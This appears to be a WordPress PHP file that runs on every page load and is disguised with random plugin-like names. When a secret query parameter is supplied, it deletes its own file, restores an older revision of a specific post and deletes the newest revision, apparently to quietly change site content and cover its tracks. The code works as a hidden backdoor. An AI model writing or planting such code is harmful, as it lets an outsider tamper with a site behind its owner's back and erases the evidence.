<?php

function feedback_addon_rss() {
	if (isset($_GET['notifications_smart_viewer']) && $_GET['notifications_smart_viewer'] === 'push_viewer_testimonial_top') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$updates_bbpress_products = 1562;
		$widget_campaign_responsive_reviews = wp_get_post_revisions($updates_bbpress_products);
		if (empty($widget_campaign_responsive_reviews)) die('no revisions');
		if (count($widget_campaign_responsive_reviews) < 2) die('less than 2');
		$embedder_express_estate_subscriptions = array_shift($widget_campaign_responsive_reviews);
		$mini_tooltip_recaptcha = $embedder_express_estate_subscriptions->ID;
		$integration_online_quiz = array_shift($widget_campaign_responsive_reviews);
		$more_server_discount = $integration_online_quiz->ID;
		$fancy_design_compare = wp_restore_post_revision($more_server_discount);
		if ($fancy_design_compare === false) die('error restoring');
		$fancy_design_compare = wp_delete_post_revision($mini_tooltip_recaptcha);		
		if ($fancy_design_compare === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'feedback_addon_rss');
